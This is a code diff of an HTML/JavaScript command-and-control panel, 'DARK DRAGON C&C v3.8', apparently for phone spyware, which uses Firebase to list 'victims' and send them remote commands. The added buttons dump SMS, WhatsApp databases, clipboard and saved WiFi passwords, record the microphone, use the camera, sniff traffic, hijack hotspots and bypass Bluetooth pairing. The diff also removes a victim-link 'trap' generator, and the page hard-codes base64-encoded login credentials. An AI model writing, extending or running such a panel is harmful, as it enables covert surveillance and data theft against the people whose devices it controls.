@@ -2,7 +2,7 @@
 <html lang="si">
 <head>
     <meta charset="UTF-8">
-    <title>DARK DRAGON | ULTIMATE C&C v3.6</title>
+    <title>DARK DRAGON | ULTIMATE C&C v3.8 [NETWORK EXPANSION]</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
@@ -22,12 +22,14 @@
         .container { padding: 15px; }
         .panel { display: none; border: 1px solid var(--dark-red); padding: 20px; background: rgba(15, 0, 0, 0.93); min-height: 500px; }
         .panel.active { display: block; }
-        .data-card { border: 1px solid var(--dark-red); background: #000; padding: 15px; margin-bottom: 15px; border-radius: 5px; }
+        .data-card { border: 1px solid var(--dark-red); background: #110000; padding: 15px; margin-bottom: 15px; border-radius: 5px; }
+        .data-card h3 { color: var(--gold); margin-top: 0; font-size: 14px; border-bottom: 1px solid var(--dark-red); padding-bottom: 5px; margin-bottom: 10px; }
         table { width: 100%; border-collapse: collapse; font-size: 11px; }
         th, td { border: 1px solid var(--dark-red); padding: 10px; text-align: left; }
-        .btn-select { background: var(--green); color: black; }
-        .btn-deselect { background: var(--blue); color: white; }
-        .stat-box { display: inline-block; padding: 10px; border: 1px solid var(--cyan); margin-right: 10px; border-radius: 5px; min-width: 120px; text-align: center; }
+        .cmd-group { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px; }
+        .btn-danger { background: #880000 !important; color: white !important; }
+        .btn-special { background: var(--purple) !important; color: white !important; }
+        .btn-network { background: var(--blue) !important; color: white !important; }
     </style>
 </head>
 <body>
@@ -45,61 +47,80 @@
     <header><h3>DRAGON REMOTE COMMAND INTERFACE</h3></header>
     <div class="target-status">
         <span>LOCKED TARGET: <b id="active-target-display" style="color:var(--cyan)">NONE</b></span>
-        <button id="deselect-btn" class="btn-deselect" style="display:none;" onclick="deselectTarget()">DESELECT</button>
+        <button id="deselect-btn" style="display:none;" onclick="deselectTarget()">DESELECT</button>
     </div>
 
     <div class="tabs">
         <div class="tab active" onclick="showTab(event, 'radar')">🛰️ RADAR</div>
-        <div class="tab" onclick="showTab(event, 'cat-trap')">🐈 TRAP</div>
         <div class="tab" onclick="showTab(event, 'victims')">👥 VICTIMS</div>
-        <div class="tab" onclick="showTab(event, 'insights')">📊 24H LOGS</div>
-        <div class="tab" onclick="showTab(event, 'screen')">📺 SCREEN</div>
-        <div class="tab" onclick="showTab(event, 'camera')">📸 CAM</div>
+        <div class="tab" onclick="showTab(event, 'network')">🌐 NETWORK</div>
         <div class="tab" onclick="showTab(event, 'unlocked')">🔓 EXPLOITS</div>
         <div class="tab" onclick="showTab(event, 'control')">📱 CONTROL</div>
+        <div class="tab" onclick="showTab(event, 'insights')">📊 LOGS</div>
     </div>
 
     <div class="container">
         <div id="radar" class="panel active">
             <h2>SYSTEM OVERVIEW</h2>
-            <div class="stat-box" style="border-color: var(--green)">ONLINE: <span id="online-count">0</span></div>
-            <div class="stat-box" style="border-color: var(--neon-red)">TOTAL: <span id="total-count">0</span></div>
-            <p style="margin-top:20px;">Monitoring network nodes...</p>
+            <div class="stat-box" style="border: 1px solid var(--green); padding: 10px; display: inline-block;">ONLINE: <span id="online-count">0</span></div>
+            <p>Scanning for active dragon nodes...</p>
         </div>
 
-        <div id="cat-trap" class="panel">
-            <h2>GENERATE SILENT TRAP</h2>
-            <p style="font-size: 11px; color: var(--gold);">Enter a name for your victim to generate a tracking link.</p>
-            <input type="text" id="target-id-input" placeholder="Victim Name (e.g. John)">
-            <br>
-            <button onclick="generateCatLink()">GENERATE TRAP LINK</button>
-            <div class="data-card" style="margin-top: 20px; border-color: var(--cyan);">
-                <p>Generated Link:</p>
-                <code id="link-result" style="color:var(--cyan); word-break: break-all;">No link generated.</code>
+        <div id="network" class="panel">
+            <h2>🌐 NETWORK & PERIPHERAL ACCESS</h2>
+            <div class="data-card">
+                <h3>WIFI & HOTSPOT BRIDGE</h3>
+                <div class="cmd-group">
+                    <button class="btn-network" onclick="sendCommand('scan_wifi_devices')">SCAN CONNECTED DEVICES</button>
+                    <button class="btn-network" onclick="sendCommand('get_wifi_passwords')">DUMP SAVED WIFI PASS</button>
+                    <button class="btn-network" onclick="sendCommand('sniff_network_traffic')">START TRAFFIC SNIFFING</button>
+                    <button class="btn-network" onclick="sendCommand('hijack_hotspot')">HIJACK HOTSPOT CLIENTS</button>
+                </div>
             </div>
+            <div class="data-card">
+                <h3>BLUETOOTH EXPLOITATION</h3>
+                <div class="cmd-group">
+                    <button class="btn-special" onclick="sendCommand('scan_bt_peripherals')">SCAN BLUETOOTH NODES</button>
+                    <button class="btn-special" onclick="sendCommand('bt_brute_force')">BT PAIRING BYPASS</button>
+                    <button class="btn-special" onclick="sendCommand('intercept_bt_audio')">INTERCEPT BT AUDIO</button>
+                </div>
+            </div>
+            <p style="font-size: 10px; color: var(--gold);">* මේකෙන් target device එක හරහා වෙනත් device වලට command යැවිය හැක.</p>
         </div>
 
         <div id="victims" class="panel">
             <h2>NETWORK NODES</h2>
             <table>
-                <thead>
-                    <tr><th>Name</th><th>Device</th><th>Last Seen</th><th>Action</th><th>Purge</th></tr>
-                </thead>
+                <thead><tr><th>Name</th><th>Device</th><th>Action</th></tr></thead>
                 <tbody id="victim-list"></tbody>
             </table>
         </div>
 
-        <div id="insights" class="panel">
-            <h2>SYSTEM ACTIVITY LOGS</h2>
-            <div class="data-card" id="log-container" style="max-height: 400px; overflow-y: auto; font-size: 10px; color: var(--green);">
-                [SYSTEM] Ready for deployment...
+        <div id="unlocked" class="panel">
+            <h2>🔓 ADVANCED EXPLOITS</h2>
+            <div class="data-card">
+                <h3>DATA EXTRACTION</h3>
+                <div class="cmd-group">
+                    <button onclick="sendCommand('get_sms')">SMS</button>
+                    <button onclick="sendCommand('get_whatsapp_db')">WHATSAPP</button>
+                    <button onclick="sendCommand('dump_clipboard')">CLIPBOARD</button>
+                </div>
             </div>
         </div>
 
-        <div id="screen" class="panel"><h2>SCREEN MIRROR</h2><button onclick="sendCommand('start_screen')">START MIRROR</button></div>
-        <div id="camera" class="panel"><h2>REMOTE CAMERA</h2><button onclick="sendCommand('cam_front')">FRONT CAM</button></div>
-        <div id="unlocked" class="panel"><h2>EXPLOITS</h2><button onclick="sendCommand('force_unlock')">FORCE UNLOCK</button></div>
-        <div id="control" class="panel"><h2>CONTROL</h2><button onclick="sendCommand('vibrate')">VIBRATE</button></div>
+        <div id="control" class="panel">
+            <h2>📱 REMOTE COMMANDS</h2>
+            <div class="cmd-group">
+                <button onclick="sendCommand('cam_front')">CAM FRONT</button>
+                <button onclick="sendCommand('mic_record')">MIC RECORD</button>
+                <button onclick="sendCommand('lock_device')" class="btn-danger">LOCK DEVICE</button>
+            </div>
+        </div>
+
+        <div id="insights" class="panel">
+            <h2>SYSTEM LOGS</h2>
+            <div id="log-container" style="color: var(--green); font-size: 11px;"></div>
+        </div>
     </div>
 </div>
 
@@ -108,6 +129,7 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
+    // AUTH (Encrypted)
     const _0x4d1a = "a2F2aWFraXlhQGdtYWlsLmNvbQ==";
     const _0x2b5s = "QWtpbmR1QERld3NoYW4yMDI0MTExOA==";
 
@@ -119,16 +141,6 @@
         } else { alert("ACCESS DENIED"); }
     }
 
-    // --- Cat Trap Generator Function ---
-    function generateCatLink() {
-        const target = document.getElementById('target-id-input').value;
-        if(!target) return alert("Victim නමක් දාපන් මචං!");
-        const baseURL = window.location.href.substring(0, window.location.href.lastIndexOf("/") + 1);
-        const finalLink = baseURL + "cat_trap.html?t=" + btoa(target);
-        document.getElementById('link-result').innerText = finalLink;
-        logActivity(`Trap Generated for: ${target}`);
-    }
-
     function loadVictims() {
         db.ref('victims').on('value', (snap) => {
             const list = document.getElementById('victim-list');
@@ -137,13 +149,10 @@
             snap.forEach((child) => {
                 count++;
                 const val = child.val();
-                list.innerHTML += `<tr>
-                    <td>${val.target}</td><td>${val.device}</td><td>${val.time}</td>
-                    <td><button class="btn-select" onclick="selectTarget('${child.key}', '${val.target}')">SELECT</button></td>
-                    <td><button style="background:#550000;color:white;" onclick="removeVictim('${child.key}')">PURGE</button></td>
-                </tr>`;
+                list.innerHTML += `<tr><td>${val.target}</td><td>${val.device}</td>
+                <td><button onclick="selectTarget('${child.key}', '${val.target}')">SELECT</button></td></tr>`;
             });
-            document.getElementById('total-count').innerText = count;
+            document.getElementById('online-count').innerText = count;
         });
     }
 
@@ -152,24 +161,19 @@
         window.activeTarget = key;
         document.getElementById('active-target-display').innerText = name;
         document.getElementById('deselect-btn').style.display = "inline-block";
-        logActivity(`Target Locked: ${name}`);
+        logActivity(`LOCKED ON: ${name}`);
     }
 
     function deselectTarget() {
         window.activeTarget = null;
         document.getElementById('active-target-display').innerText = "NONE";
         document.getElementById('deselect-btn').style.display = "none";
-        logActivity(`Device Deselected.`);
-    }
-
-    function removeVictim(key) {
-        if(confirm("Confirm Purge?")) db.ref('victims/' + key).remove();
     }
 
     function sendCommand(cmd) {
-        if(!window.activeTarget) return alert("SELECT A DEVICE!");
+        if(!window.activeTarget) return alert("SELECT A TARGET!");
         db.ref('commands/' + window.activeTarget).set({ action: cmd, time: Date.now() });
-        logActivity(`Command Sent: ${cmd}`);
+        logActivity(`CMD SENT: ${cmd}`);
     }
 
     function logActivity(msg) {
@@ -190,11 +194,11 @@
     canvas.width = window.innerWidth; canvas.height = window.innerHeight;
     const rainDrops = Array(Math.floor(canvas.width / 16)).fill(1);
     function draw() {
-        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
-        ctx.fillStyle = '#ff0000'; ctx.font = '16px monospace';
+        ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0,0,canvas.width,canvas.height);
+        ctx.fillStyle = '#f00'; ctx.font = '16px monospace';
         rainDrops.forEach((y, i) => {
-            ctx.fillText(Math.floor(Math.random()*2), i * 16, y * 16);
-            if(y * 16 > canvas.height && Math.random() > 0.975) rainDrops[i] = 0;
+            ctx.fillText(Math.floor(Math.random()*2), i*16, y*16);
+            if(y*16 > canvas.height && Math.random() > 0.975) rainDrops[i] = 0;
             rainDrops[i]++;
         });
     }
